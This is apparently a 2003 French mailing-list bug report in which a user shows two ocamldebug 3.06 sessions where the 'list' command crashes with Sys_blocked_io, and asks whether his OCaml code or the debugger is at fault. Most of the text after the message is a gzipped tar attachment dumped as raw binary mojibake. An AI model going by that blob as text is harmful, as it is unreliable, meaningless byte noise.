../test/test7\n\nj'ai effectuer les commandes suivantes :\n\n$ ocamldebug ./a.out ../test/test7 \n        Objective Caml Debugger version 3.06\n\n(ocd) break @ Main 4\nLoading program... done.\nBreakpoint 1 at 136552 : file Main, line 7 column 3\n(ocd) run\nTime : 26606 - pc : 136552 - module Main\nBreakpoint : 1\n7               <|b|>let leng = Array.length arguments\nin\n(ocd) list\n1 (* vim: set ft=ocaml : *)\n2 (* $Id: main.ml,v 1.9 2003/05/07 16:21:34 corentin\nExp $ *)\n3 \n4 let read_conf_file = \n5               (* see module Arg. ... *)\n6               let arguments = Sys.argv in\n7               <|b|>let leng = Array.length arguments\nin\n8               if leng <=1 then\n9                      \n(*-------------------------------------------------------------------*)\n10                      (*                            \n                                      *)\n11                      (*            read the\nconfiguration file from stdin                 *)\n12                      (*                            \n                                      *)\n13                     \n(*-------------------------------------------------------------------*)\n14                      let lexbuf =\nLexing.from_channel stdin in \n15                                      Parser.main\nLexer.token_rule lexbuf \n16              else\n17                      let conf_file = Unix.openfile\narguments.(1)     [Unix.O_RDWR] 0o700 in \n18                              let\nconf_file_input_chanel = Unix.in_channel_of_descr\nconf_file in \n19                          let lexbuf =\nLexing.from_channel conf_file_input_chanel in\n20                                                    \n let cam = Parser.main Lexer.token_rule lexbuf in \nUncaught exception: Sys_blocked_io\n$\n\nOn remarque donc que, dans ocamldebug, la commande\n\"list\" fait planter ocamldebug.\n\nDe mÃªme avec le fichier \"test6\" :\n\n$ ocamldebug ./a.out ../test/test6 \n        Objective Caml Debugger version 3.06\n\n(ocd) break @ Main 4\nLoading program... done.\nBreakpoint 1 at 136552 : file Main, line 7 column 3\n(ocd) run\nTime : 26606 - pc : 136552 - module Main\nBreakpoint : 1\n7               <|b|>let leng = Array.length arguments\nin\n(ocd) list\n1 (* vim: set ft=ocaml : *)\n2 (* $Id: main.ml,v 1.9 2003/05/07 16:21:34 corentin\nExp $ *)\n3 \n4 let read_conf_file = \n5               (* see module Arg. ... *)\n6               let arguments = Sys.argv in\n7               <|b|>let leng = Array.length arguments\nin\n8               if leng <=1 then\n9                      \n(*-------------------------------------------------------------------*)\n10                      (*                            \n                                      *)\n11                      (*            read the\nconfiguration file from stdin                 *)\n12                      (*                            \n                                      *)\n13                     \n(*-------------------------------------------------------------------*)\n14                      let lexbuf =\nLexing.from_channel stdin in \n15                                      Parser.main\nLexer.token_rule lexbuf \n16              else\n17                      let conf_file = Unix.openfile\narguments.(1)     [Unix.O_RDWR] 0o700 in \n18                              let\nconf_file_input_chanel = Unix.in_channel_of_descr\nconf_file in \n19                          let lexbuf =\nLexing.from_channel conf_file_input_chanel in\n20                                                    \n let cam = Parser.main Lexer.token_rule lexbuf in \nUncaught exception: Sys_blocked_io\n$\n\n\nCela vient-il de mon code ? ou est-ce un problÃ¨me de\nocamldebug ?\n\nMerci de me mettre au courant de vos rÃ©sultats.\n\nCordialement\n\nCorentin Jechoux\n\n___________________________________________________________\nDo You Yahoo!? -- Une adresse @yahoo.fr gratuite et en franÃ§ais !\nYahoo! Mail : http://fr.mail.yahoo.com\n----------------\n\u001fâ¹\b\bÃ³\u0006Ã>\u0000\u0003camelog_14May2003.tar\u0000Ã¬=ÃvÃ¢HâÃ½:|E\u000eÃÃmÃÅ¡;Â¾\u0014e|\u0006\u0003Â¶â¢Ã±m\u0000WWÃ¯Ã¬Å>BÂ¤!Â»ââIIÃtÃÃ®Ã¿Ã_Ã¬c3ÃÃ³Â²o\u001bââ¢\u0012â\u0010ÃÂ®Â²]Ã¥SÂ¨N\u0019ââÃÂ¸GdÂ¦RËÃËZ|Ã°ÃS^Ã¹|9Â¿Â»Â½\rÅ¸Ã¹b~Â§\u0014Ã¾Ã´Â¯oÃ²Â»;ÃÂ¥biÂ§XÃâ¦Ã²BqÂ·?Ã¿fÃ»IÂ±ÃâÃ§Â¸â â¬!M.Â¨Ã­2{YÂ»Â»Ãª_Ã¨e*Ã¹Ã§Å15?'\u001aÃ£Å¾Ã²/Æ\u0006Ã¬Ã¦Ã³X^(Ã§â¹â¦ÂµÃ¼Å¸Ã¡Å Ã?WÃyâ1>FÃ¾Ã¥Ã­Ã²ZÃ¾Ãp-Ã?ÃÃ¦Ã}Ã1Ã²â¦|~Â§\\^.Ã¿?\u0005Ã¹ÃÂ·Ã¢7Ã¹ÃE#Ã¹ÃºÃÃ¥_Â¡Â·nÃÂ§Ã­?ÃB)[.d\u000bÂ¥Â½laÂ»\\ÃyÅ½ÃYÃ4Â¬Å9q\u0004(FÃªsÃ£Â»Â¾\u001eÃ·JÂ°:Ã¦\u000esÂ¹Ë>Ã\u0018wÃq7nÃ¿;;Â¥ÃÃÃ¾Å¸Ã¡Â²Ã¨OÃâ¬\u0001ÃE\u0014amÃ¦_ÃÂµhÃ¿MÃ\u0015Å>Ã¦\\Ã NÃ»Ã\u0017\u0017Ã¬?\u000fÃ¹ÃÃÃ¾Å¸Ã¾jÂ¬MÃ½Â«Â¾|Ã»?3>Ãk\u0006Ã\u0000\nÂ¬Â¬;Â¶\u001eqÅÃÃ¶_(ÃÃ¼PÃywÂ»Â°]âÃ¶_,Ã¬Â¬Ã­Ã¿\u0019Â®WÂ¯\u001fÃ£zâ¢zE\u001eÃ£Z\rÂ§\u000eÂªINÃ`Ã¨~\u001aÅ?ÃÃ§âQ!(Ã¹?2gâ¹Å\u0005Ã¿â¢ÂºÂ¤.\u0018h?ÂµEZÃ§Ã­V?Â´Â¹Ã¹w?Ã&Ã·âÂ»\u0014ÃÂ§Ã¡SÃ§Ã£Â©?\\(Â¼yÂ³GZÂ¶Ã£2ÃsÃÂ¹Ã¡2n\u001b\u0016Ã©SÃÂ¦Ã¦?\nÃ¸OÂ¨\r-Â®Â¹\u0018A-`FÂ¨Ã«Ã?Å¡Å¡Ã§r]â%Â¤\u0001â\bÃÃ³\\Ã'ÃÂ¶Â¦Â¤7%c*FÃq\u0000pÃ¶nÃ¾|\u0012]CÃ\u001dWr9Ã©Ë-ËâÂ½\u0016Â¹Â£Ã_Â¢Â®)CÃ­AvÃ¨â\",Ã¥Ã#Ã¡Ã³Hp\u001eÃÂ¾\u0012\u0011:Â¦6\u0015Ã$>â¡\bÃ9l%ââ\u000fâ1rÂ Ã·Å â¹4Â¸Ã©?ÃÂ¹IÃ½!Ã?RÃâ.'Å¾Câ°;dN0f\u0005Ã3\u0019Ã²#Ã·Ã\b|)Â¹fÂ·Ãâ¬ââ°a?Â¶Ã±k}\u0003Ã²Ã¬\u0001â?â¹Â«vÂ½Ã!=\b:7YÃ¨ÂºÃMÂª\u0006Ã¸ÃÃ\u0002â¦D\u0010SÂ°&Eâ\u0003ÃLÂ \u0013\u0006vÂ²âºÂ±Â¡MA\râ\u0012CVâlÅ¸Å½Â©ÃÃ\u0002ââ¢=â¬Â¦ÃÂºÃ3â¡~Â¹\u001a\u001b\u0006â?oËe\u0011â\u0003\u000fË-â¡V?\fÃâT\u0018Â°uo(ËÃ\u001c?\u0011Ã¯{â¬Ã\u0016Å ÃÃFd\u001a\u0016ÃÅÃGciA`<\u0011F\u0001ÂºÃÃºÃ?ÃâbKÅâ°Ã\\f\u0003\tR\u0012\bIPââ¦Ã!BÃÃqÃ©hâ¹Â¸Ã1ÃÃ0âÃÂªÂ£j\nÃ&Ã£Ã­c\u001bÃ¯L\u0002VH\u0018#>QcÃ[jzÂ®âËaÃ·\t`#â¹5:}ÃÃ¾EhÂ¦E\r[\u0001Ã³1âÂ¼â?mÃ Ã\u0004aÃ´\u0003@\"Ãâ¢?]ÃÂ±OÂ¾RÂ«â¢Ã½Å¾@PÃkÃ½\tÃ°\u0011ÃÃµPfJÃ#\u0017ÃÂ³%ÂµâÃ\u0018Â¶K\\\u001ehÂ¿\riâ¢Â¯Ã¼snn\u0011\u0007ÃoÃ \u0000BÃ³}Â³Â¾%-â?'Ã\u0011Â·\bâ¹BÃ¥=Â©â\u0006Ã\u001c4h\tÂ¾OFÃÅ¸Â°Â Â¢??Âª_\u0012BÃÂ¦Ã\u0010'w\f\u0002ÆÃzÃÃÃ\u001d\u0002Å¡Â°>TÃ0w(1RÃ¦Â¥â\fm\u0003Ã\u0019\u000fâ¢\tb6D?Â¹Ã\u000fâ\u0001Ã¨\u0019ÃX@loÃÂ£\u0002*\u0005\u001dxâ!â¬HÂ¨âq\u0002B\u0007Ã8b\u000fÂ :âºÃn\"Â¸Â©oÂ£q\u0006?ÃÃa\u0007iÃBÃ\nÃ¢?l\u0003Â¼\u000bÂ°Ãâ#Å½Âº2Ã§?Ã«;\"J|<uÃ³Â©Ã¬Ã­\u0003Ã½vÃ£â¡VÃ·Ã¤Â¸]Â»<iÃ;âºÃ)Â¬ÂªÃÃâ_Ãâ¹\u0018S\tÃÂ°Â§Â¾Ã°Â®Â¹\u0005Å¾\nâ¢\u0018Ã¨Ã«ÆÂ±ÃÃÂ´?Ã´ÃpHÃÃ§Â«âËÅ¡n~uÃz\u001fozeÆÃ¢0ÃÂ¥Ã¢Ã0iÂ¬CÂ§ÃÅ½Â·O`Â»Ã¢9Ã`Â³1ÃI_\u001eâ¦s~uÂ¶â¬câp?:w8Â¢Ã ÃÃÃ0?â¬Ã²k\u0000ÃâvÂ³ÃXâ¬ÃâºÂº4#\rÃ\u001dâ\u000bÃ®Ã\tn\u001cÅ¾ÃÂ»4\fÃ â¡\u0006Ã°ÃºÃÂ°a\u00001Ã¯Â²Ã\u000b?&Ã¸#\u0010ÃÃ!+ÂµÃ\u0011â¬\u001fÂ¦Ã¢{'?Â¤â\u001cÃ¶TÃ\u000bÂ¬C\u0006\u001fâ¡lâ¬Å¸Â¶Â¼>r\u001bSâÂ©aÅ¡ÃOÃ¢?Eo#A\ntÃ\u000fjÃâ\u0006\u0016rÂ¯2Ã¸â¬Â¢\u000e0âcÃ°Ã\u0000\u001d3<Ã%FâCNÃ§Ã}Ã \rj\u0007\u0000ÃF.kVS\u0017r]\u000f'ÃÃ·ÃN6d\u0016Ã¨Ã Â£T676Ãip\u0002âÆÃ²ÃÃâ¡Ã\u0013]â¬Åâ¢#Ã\u001câÃÂ¤ÃªÂµÂ³SD\u001d9dÃÂ»â¹Ã.0\u0004Â¿5Å¡âÂº\u0006Â¢â,9mÂ¾Ã%ÃMYÃ²cÂ­Ã®wGnÃ»ÅÃ´Ã³\u00039Ã¸ÃÂ¹Â¡ÃÃ³\u00030Ãµ}&t9\nÃ¹ÃeÂ®@Â»\fÂ´QÃ¿;ËÅ¸Ã¿\u0015-ÃÃ¿Â®?aÃ³Â¿0ÂµÃÃz\u000eRâP\u0011ÃÃ?{\u0016Â Aâ¢ÃÃ£$câ\u0007Ã¤#ÃÂ»Ã<Ã\u001cÂ£\u0007?\u0018\u0000 ÂºÃÂ²I]ÃÃÂ¡1âÃÃÃÃÃ¶\u0007Ã}KVÃÃÃ`0IÂ±Ã¨\u0004Æ\u0007â \u0015Å½lÆÃ°\nÂ¸ÃÂ¯:Ãâ¹Â³ÂªF\u0004âlhu\u0003\u0014]Th?\fâÃ³zÂ®6Ã\u00101Ã¦ÃÂ°\u00070Â´Â¢\u0002Ã½Â²Ã!\nÃ£\u000fjbs\u001c\u001cÃÃ\u0017ÆÂ¯\u001bÃTÃeV}'â¢Ã½Ã\u0000\u0006â¢\u0000â¦dÂ¬ÃsÃº%Â§r+Ãª}Â¡ÃÃÃÃ\u0002Â¿%\u0014Â¥R?WÂ­z`)\u0011HXÂ \u001aÂ \u0017Â­ââÅTÃÂ½Âªâ¢Â¾Â±\na-Å \b\u0016Â¨\u0006Â¾Ã¯Â«j\u001f\u0017iÂ¦ÃTKtwÃ~o\u0014i\u0001ÃÃ\u001bâ¦Ã ÃÃÂ¢\u0005Ã»ÃÃ­Å¾VÃ»Â©â¢ÃÃ¢Ã¸2!\u001e\u001b0uu\u0002y\u000fÃ$cÂ±Ã±9â¡\u001c\u0016Â³;.\u0015Ã\u001bÂ£ÃÃº~Ã¢SQKAÃYÃÃ¹)Ë\u0017Âº>Ã_ÃbË$Ãº6â¹)cÃªâ¢Ã´)?m\u0001NÃ¨Ã\u0018\u0017\u001c\u0012V.U#?Ã²\nEâ\nÃµÅ kÂ JÂ®Kâ¬â¡\u0014!\u0011Â¶Â¯\u0014\u0001Â´D(Z#\u0013!Â vÂ®Ã®Ã­+lbwÂ©Â¼Â«Ã»Ã»Ã¶âÃ_ÃÃÃªÃ¾ZÃ\u0013Â»'ÂªÂ¼\u000eâ \u0005Ã°Ã¦ÃnÃ¨âºJ\u0016Ãz\u0015Ã¾lÃºÃÃpu\u0001Ã«-UqÃ¸Â§NÂ¸Â®ËuÃÂ¬9Ã¢PwÃ]Z?Ã¡SÂ«\rÃª\u000fÂ¶ÃLÃ½Ã®Ã\r\u0019ËÃÂ£+ÃÂ¸I2ÃW/Ã¸DWÂ¾\u00194Oâ¦Ã´N\u0002QÃ£\u0005pÃ >Â¡\u0005Ã¸#106Ã}RÃÃÃÃQÃ«=P\u001fÃºJ\u0000]Ã¼ÃHÃ¶\u0017\u000eÃ¿Ã¡\u0013zbâ°,Å¾BÂ·â\u0005Uâ¢\u0010Ã®\u0019â|Â»/+\u0018tHÂ®A(â¢(Å¾A]\u0004\u001eâÃMÂ¬Ë\u0002y\rÃtÃ0Â XÃ£\u0000nÃ|\u001a\u0006?1|\tlÂ¶lÂ¼idÂ¼8âÃâ¬l%\u001aÃ¬~h(\u001aGÃ\u0002â°\nLÂ¨\"\u0000ââÂ³^(\u0017Â Ã«ÃÃ¤uÃ¶âÂ¿2~Ã»7Ã²ÃºH\u0016Ã¾Â¿zÃ½ÃÂ¯Ã²Â½XÃ´Vy1Â½(Q\tÂ©nÂ W? m\u0012â°Å¸Ã¼K\u000eâ%ÅÃÃÃµRÃ©kÂ°BÂ²Ã\u0001ÃºÅ /Ã¿Â§ÃÃ'\u001bÃ£Â¾ÃÃ¿nÃ¯Ã¦KÂ¥?\u0002Ã®Ã¿âÃÃÂ¥ÃµÃ³Ãpâ¦Ã¤Å¸sÂ¦\u000e|ÃÃ¨\u0005Ã¶Ã\u001bcÃ¥Ã¾_\u0001Ã·ÃºÃ¡Ã».HÂ¿Å\u000f~ÂªÃ½Ã¿Ri{Â½Ã¿Ã·\fÃÃ¾Ã¯\u001b\u0017ÃµÃ®?âMrÃ=;%âWâ¡Â§Â­:IgrÂ¹\u001fJÃµ\\Â®ÃmÂ¨Å r6_ ]aÃ\u000eSÂ»LÂ¹\\Ã³<}?ÃÃZÃ¼â¬Ã\u0011|t[ÃÃÃ¦ÃIÂ§N2Ã¤PÃ¼\u0006ÃÃÅÃÂ âl^-Ã@ÃÃ©(5;?ÃÃÂ©Ã¦Â©Ã½Â³fÂ·\u0006Ã£t/3ÃÂ¿\\ÂµÃUÃunÂ»ÃÃ®Lw:Â¦iRÂ¿8Ã¯6ÃÂ»ÃÂ´KoÃ\u001c*Ã§[Åâ \nËvTâ¢Ã3{{Ão2â¦Ã´*@Â§0iÃµÅA\u0018ÃÂµ\bzÅÃÃÅ¡ÃtÃsâ¡\\âZÃÃÃÃp\\*Ã¾8tÃÃ¬BÃ»`#.ÃeÂ¾9Â·anâÃâºÂ½7â¢\"Â¨;9Â¡b2#\u001dÃÃÆL\u0019Â°r`Ã\r3tâ¡l\u0000Â·6q\u001fÂ£\u0006IÅ¾Ã¬Ãª\u0010Aa\u00068Â¡Ã½Ãâ¬}ÃªËâÃÃ;4Â¤Ã¤Â³C$ÃWp;\u001b\u0003Ã¶?NoÂ¸Ã¨;!H=âÂ´E\\6âpâ°_x09âÃ\u001dÂ°Ã3qÃ\u001fâ ÃZNÃ\u0016qfÂ¦'Ë;#,Â´Ã«\u0018*\u00163â¡\u001aÃÂ¼\u0000ÃÃÃ¥7\u001aÃ¯Ã¡\u0017#3d\u000f]\u0010Â£Â£mÃ ÃEË\nÂ¹+fXÃÂ¬ÃÃ½Ã±Â´IPÂ½ÂµÃ®ËÅ½\u0003Ã¥=ÃÅ¸â_Gâ \u00180Â»BÃ²oÃ5hIÃ¦Ã\u00181kZ!\u0013*Ãºâ mlÃ¡Ã¬ÃÃ\u001aRkâKÂ¡Ãâ\u0003ÃÅ¸\u0001Â¹Â°kÃÃaÂ¿Ã\n)\u0014ÃÂ·oÃ¿;Ã¥Ã¶\u001f\u001bÂ¢A~5Â¹ÃEâ¦Â¼Ã)Ã¬Ã®\u001dâÃ\u0012Â¤!ÃÂ§Ã â¹Â¤|+ÃÃ¦6ÃÂ¦YC6%Â¿FÃÂ½Ã¯x%\u0018O\u0015ÃPTÃ\nÃ©qÂ«\u000f6Ã¦\u000f_Â¬Ã¥Ã·Å jÅÅ¾eË\u001f>rÅ\u0002Å½Ã£\u0003U?_\u0002?$\u0001}(ÃÃ²Ãâ¬Ã\fQâ¹\u001e\u0011Ã¸âÂ¼^(;Â®9\u0007â¡Ã¶â\u0018Gâ¬Ã®Ã¦Ã±\u001f\u0002Â­\f9Â Â·EÅÅ aÃ]Â¾@qÃ«u=Ã°~NÃ\"ÃdNâ¡Å ÃÆÂ³ÃÃÃ¿âÂ¶ÃÃ©Ã°Â¢Ã±#9<Â®_Å^Â´Â«i-â°4Ã©6ÃÆÃ¡k2ÃÃ¤Â´yÃ=Â«Âµ?[Ã§Ã4Ãv/.CwÃªÃ«\u000fÂ­FÃ·$tÃl\u001dÅ¸teÃiÃ«Ã¼Ã\u0000LÃ\\Å¡Â¼â¹ÃÃÃ´Â½\"-Â­)9Â¡\u0006Â®ÃK$ÃÃÃ¾\rÃ«Â»Ãj\u001arÅ¸?Â¤ÃÅ¾\u0004TKÃ°&Âµ,glËÃ Â´âÃ»Â±ÃÃ¯Ã»Ã·Å½7\u0002?2Â­Â¦\u0011Â´+Ã°OÅ¸\b~\u0003}Ã¬jÂºË\u000e\u0000âÃÂ¤qâ?\rÂ ÃÃ¥c\u0018\u0004Â´f pÃÂµÅ¡Ã\rÃuÂ®g\bA3Ã Ã¾yÂ¦7ÃÃ¾<\u001eÂ¤\u000fÃ¶\r2\u0014Ã´ÂºÅ¡Ã?[ÃÃÃdUpÃ1Â»OoeÃª'CÃ>\u001b\rË#Ã\u0005X\u0012P\u0004â¹Â¡Ã´\u001aÃÃ´âºÂ½41,Ã¸\u0002A\"LÃ³Ã~Ãâ¬Ã¿n_\u0011Ã£7/âÃQ.Ã¹ÃÅXÂ¿oQâ%oMÅ \u001bc\u0000Â¥Ã&\u000beGÃ Ã¶â¢JâL\nGÃ¥ÃN-MÅ½juÅÃ§RÂ«O\u0012Â´:M:Â­Ã¿â\u0016?3Ã¬Ã·\u000eÃ¶mÃ\u0013\u0007uÂ£ÃlËtrz\u001eÅ¾Â©?\u001cÃpmÃcÅ½\fÃ±?Ã¤tÃ3ÃbeÃ\f\u0004Â¨vlÂ¶Ã\u000fÃR\u0010Ã\u0016Ã©Ã/sÂ­KÅÂ£-D\u001bâ ÃÃÃAÃ·s0|\u000eiâ¬\u000f o5âÃ{KyÂ¤Ã²?Â¹x_Â¡F$Ã\u0010â6\u0004\u0011ÃÃ+FDâ°ÃÆA\u000bÃ©?ÃJâ¢Å¾Ã\r>\b@âTpÃ§Ã§7â¡\u0018Å¾|fâÃ\u001erÃ2Ã\u00183Â¬Â°Â´sÂ Ã?\u0012Æâ\u0002%Ã¶\u0007Ã-Ãâ8BÃ2â¢Å¾0ÃÂ£Ã\\Â©âÃTm@â¢#DÃ®\u0014\nÃÃâ¢Â¾.ÃgÃ1B\"Â¸ÃÂ¨Å iÃ³ÃSÃ¸\u0001\u001fÃ³ÃÃ½LÂ¿O\u0007\u0002Ã¼R\"âÃÃ¬\u0016Ã3@c?<Hâ¡t/Â Â©â^>Ã¤ÃÂ·Âº|~{oÂ¯xÃ¿\u0001\"JÂ¡ÃÂ³\u001bÂ¶Ã¿Â°\"XÃ´ÃÃµÃ\\â¢Ãµ;\u001d\tÃ¯kÃÃ¯Â¸Ã§?Â¹?\"3â}gÃ·ÅÃ±[4Â»\nÃÂ¯âÃºiÂ­ÃÂ©Â¦UÃMââvÃ³\bÂ°?yÃÅ¡izâYÃ»Â¹Ã\u0001Ã¹nÃ Â¾]Ã\u0011Ã·Ã¢Ã&q\u001cF;Â¨y\u0018ËÅ¾Â âEh*Ã¥Å¸CZ1ÃÃÂ¾ÃâÂ¬fwÂ©â Ãâ¬Ã¿=Ã®Âº|Â´ÃÂ®LÃÃ¬ËIâ¢BJR|\u0013\u00176zL2Â¢0Â³\u0002Ã<nvÂ¡ÃD4\u0001&Â¤ÃµÃ\u001cÂ¢Â¡\u0004x\u0015wÃ²Â«\u0010[\u0016\u0018â/?â\u0002?5Ã¸\u0018?â¢ÃEÃ¦Å½!Â¹Ã¨Â§*ÃrÃE(\fÂ¥\\\u0015ÃtÂ­jÃ\u001e{Â®|V\nâ.Ã OaÃ®â ÃÃ¯\u0000ÃºÃÂ¾fÆÂ´zTNÃG#Â­ÃÃâ\u001fâ¬Ã\u000b\u0018Æ\u001eÃ?ZÃ.Å¡BÃºÃÃ´dN\u0003K'\rÃFr\u0006Â¬âºÃ°\u000fZVÃ¸EÃÃoqyÃ³\u000f\u0011i#\"Â¾Â´\u000bÃ?(ÅÅ¾Â£Âµâ LÃÂ«QÃ¥;Ã´Ãb,\u001b\u0000ÃÃÃÂ¡fDâ¢Ã²Â£d_ÃÃâ°Â®^e?ÃÃÃºKÂµÃ¶JÃâºÃ¶\u0000bÃ¶\u0010Â³kGÃÂªâÂ¨,â¡Â©Ã´ÃÃ°IÃÅ½âVâ¹xÂ¹ÅÅ\u0001Â«Â£a94ÃRO>\u0006Â«sâ¢eÃ¹Â¾Â¼uvL\u000e/Ã?f[\u0006â¹NÂ»Â¾Ã¨uuÅ½\u000b@Ã½Ã¬Â¶â¬Ã©+|.vÂ¸Â£[ËââOUjÂ¿[;âÃ¹u\b?zÃ³Ã´Â´sYÂ«Â·Ã?ÆÃ»ÃZÂ£Ã¡Ãâ¡âÃ~Â·\rÃ¿\u001bÃ {Å¸â¦Âªn\u0003Ã¿Â´Ã±\u000fÃÂ²ÅÂ¦0\rq\u001a}Ã2ÃGÂ¢6ÃUÂ³ÆCâ!:fÃËÂ°?rÃrÂª\u0000Ã´Â¿Æ\tÃ1LM`â2â¡\u0005â¢â°Ã®znL@\u00030Ãtq_Ã¾q'\u0018Ã±(Â¬\u0012âÃÃÂ¸\u0014ÃÃ°Â¹Â§Â§\u001dÂ»$A\u0005Ã¦Ãh\u0016ÃÃzÃ Ãâ\u0000\u0016s\u0007âÃÃ ^Ã]\u00034Ëi\u0019Å½Æ6Â­bÂ¯Ãâºs>ÂµÃ±?ÃÃÃ¥ËÃÃº8%ÃÃÃ­{\u0010\u0012v\u000e\u000fÃ¢Ã©Ãyb\u0018\u0013ÃÃâ Ã¸Â¦Ã¦\u0005K\rÃDMÃâÃ¿\u0019ÃÃ¬\u0018âÃÂ´FÃ®âÃ¬ÃÂ·7\u001e\u0002Ã¯\u000b1T\u0014NÃ bÃ?TfwK\u000b\u001f/Â¢0\u0013?Ã¯sâ¢5Ã¸Ãâ¬9?CÃ´3Ã3Ã@ÃOÃ¦ÃÃ^Ã­+Ã¦?Ã­@~;Ã§[]\u0015?Ã¯HÃ³vLâ¦Ã\u001cÂºÃ¦YÃ;Ã3Ã®9Ã£\"yÃ¸w8ââ\u0004ÃSâ¹Âµk\u000eF98Â¡ËÃÃ¼\u0004Â³\u0001\u000fFrC9Ãµ;Y#â\u0014Â¾Ã·Â«gkÃ¶%Â²oÃ¢YÂ¸ÃÃcÃBg?â¡Ã&ÃbÂ¦[ÃÃÂ¾/ÃFÃÃ«374ÃÃ[Â°ÃÃ¢\u001cimÂ¶\t\fsÃÅ[]ÃªÂ¸\u0010\\Â¿â¡Â©â°Ã°Å5Â³\u0016â¢Ã¥\u0018b?]4fâdÂ£ÃÂ©Âµ7ÃÂ¼â¹YÂ¦Ã£0ÃµÂ¬~Ã<Æ2ÃÂ¥Ã¦ÃÃâ¦Ã¸5ÃÂ¢|Ã[\u0014?ÃÃÂ§0GAÃ\u0012Å¾=Ãâ$XÃ Ã'Â¬p\u0004k\u001bÅ½dÃ´gZÃËÃ³ 2\u0007ÃÂ¥:*Ã¤Ã¬Ã¡yÂ§Ã;Ã?Â£ZÃ¾Ã¹Â§Ã!âÃ£jâYÃ­L\u00043Â©\u0007Mâ \u0013ÃÃ¹Ã'Ãâ¬Å½Ã·\u0012<@XdÃ\u0000O\u0001â¡\u001cÂ§Â¼ZWÃ¹Ã²Ã¹Ã´j\fÃ­)NÃ£\\|Ã¼ÃVg\u001cÂ°pÂ¶tÃ`Ã­3âÃ¹ÃÃ¹.ÃsÂ»L|ZÃ©Ã¹]Ã¦Ã½6Ã¿\u001eÃ¬0\u0013ËÃ¹Ã\u001dÃ¦â\nÃ·%8â?ÃÃ!\u001dâ¦Â§Ã-\u0014 qâ¡3Ã½Â´ÃÃzÃ\u0017ÃÂ°ÃÃ»ÃkfEËâ¦gÃ´Ã½ÃÃª\u000b<Â»Ã'bÃ½Ã5Ã«bÂ¬Ã\u0017)%dÂ PÂ¸fUÅUâ â¬Ã¾ÃÂ¢QÃtÃ¹Å¡a1â q\u000f2Â¨\u0005v]ÃRÂ²Ã¡ÃÂ¬\u0019\u001e2\u0018Ã7Ã²<Ã±Ã²Ã\u000bÃ¤Å¾Zâ¬Å½sOÂ¯;Â»Â¸:\u0003)Ã`EÃ°\\gÃÃ2gâ¡âºÅÂºÃ´yÃÃ¦Â½7Ëk~â \rwEÃ¬Ã~;\u0014ÃÃÂ¶ÃÆ\u0012Ã¦D2Â¾Ã´ââ¢qâ¹Â¾\bÃ»Ã·â¦5ÃÃ¹Ã±OÅ½z`v.Â´ÃsÂ´OÃ¬1_\u001cÃ\u00045â¦Ã§Ãh\u0012Å 6ÃÃ\u0002\u001fPÃ¸Å¾Å½Ã\u0016gkÅ¾ÃyÃ¦/ÃâfÃÂ³Ã°Ã²Ã£Å¡[!Â«dÅ½Ãâ¦|âºÃ§Ã$ÆÂ²5Â·Â¢ÃÃÃ·ÃPÃ`\"Â¬\\âÂª\u0010\u0006pÃÃª\u0015c\u0018ÃÃ75Q?Ã¬Ã\u0005Â¥Ã«LÃ¯?â¢Å¾|{Ã3'zÃµÃ²ÃnÃ©Ã¨Ã¹\u0013=EÃ«Ã¢Ã²\u0007â>8ÃK$Ã¢\u000bOÃ³\u0000Â Ã Ã¶KÂ°x-*A'^Ã¤Â¬ÃDÅ¾{ÃZÃ»Â´Ã®Ã±Ã1ÃÃ¤Â£â'Å¸HpÃ+UÂºpÃ¦Â¬\u0019Â·âqcÂ¯gAÃ§XXÂ¹\fâ¢Â®ÃÃÃ\u001fWp\rÃ}Ã¦?Â·ÃºÃ¡aÂ¡Â´Ã»YÅ¾U?Ã&<Â¨ Ã\u001f\u001e\\â\bÃ¹ÃÆÃÃâ gÂ¿Ë\u0007â¢âK\u000bÃ¸Ãm{Ã¹VÃ»WÃ)A!ÂªD\u001eÃ¯mCâ°<Ã:âÂ«Ã¾Å¾Ã~\u0013kÂ¾ÃÃ¹&ÃO\u001c9ÃÃ»âºCÃ¾âÃÃâÃ¯Â¬ÃµnÃ\fâ¹2lÃ]jâ¦8vÃ²oÂ¼Ãw\u000bâºCuÅÃ¦NÃ%\u0007Â¤Â®0Ë\u000bÂ¡Ã´Ã¡\u0011Ã©?\u0001;)^Â«p*Ã\u0017\u0015Â¯UPI`\u0012n\u0005Ã¡oI?Ã¿ TÅ¾1\u0005?UokÃÂ¼âºÅ¸â¢O 6DfÃ´Ã°kP\u0011Ã¦UÂ Ã¡I'Ã´â%yÃÃ´ÃE<:Â©Ãª:TÅ¾Ã¨\u00065aÂ¶ÃÃâ E\u0013\u000f7Bâ°Ã¿Ã&Â©Â¿\u0004\u000fÃ>Ã\u0019ÃÃº\u0005Ã¶8âgÅ½CÃ²:Â¬ÃÃ¿|ÃÂ¾Â¸:oDÃ¤es&Â¤Â¸>Ã?ÃÃÂ©ÃÃ¨!Ãn;Ã1l9â¡Ã³\u0005â3%?~`Ão?\u0007Â©5EÃ¸V\u001e?Ã£|\u001câÂ¹Ã )â¢Â¿ÅÅ\u0013â$Â¾â¦\u00075Â¢)OâÅ¸Ã¨Â¯\u0005Â­ÂµÃ¿8Ã¸ÃJL|Å½Å¾Âµ\u001a?Ã&4=ÅÂ¸ÃÂ»_Â¬Ã¤Â»Ã\"Â¾d,Ã²Ã¢Â¡ÆÂ¥/^PÂ©c,Ã«<\\â¦Â¦ÃÂ²?4'ÃZ1JÂ¿Â¶e.Ã­8'Â¹=ÃUÃ\b+Ã!Vâ MÃ½\u001egÅ¸5Ë7ÃÃ¸Â¤Â³ÃÃ·RÃâN\u001d)Å¡âGOVÃql{Xâ@Ã \u001e`BDÃ¾4\u0013Ã¿\u001eQrÃ\u0007\u0003F6Å orâ¦|Â®ËÃ\u00176ÃÃ¥@âºÃ½\u001c4NÃ­ÃÃ´Ã³ â¢J-Ã¾Â¬RDÂ¨Ã%fÃ¸\u0018_DÃÂ¡Ã®Ã¸Å ÂªÂ¿âKÃÂ°ÃÃËÃ¼qËÅ¡|Ã·Â¡+xÃâÃ¾1u\b\u0005?\u0019\u001eDâ¦`â¹Â¿Âª?oIÂ¬ÃÃ·Ã¢\u0007câ¦Ã\u0015Â¦\u001aPi\bc4s\u0005Â¶oÃÃ½\u0019sÃ¤Â±Â®:\u0016\u001cAÃ|;d\u0001âº8\u0006>f\u001dÃ¿U\t\u0010aÃ°7&Ã\u0000>Â¡^.â #??sOÃ\u0010Ã£Ã¥\u000fÃÃ¼6RGÃÂ¹7?HLSÆ\u0019\u001e^ÃÃ¶[Â¤Ã¿=Ã¿?baÃ¥(Ã 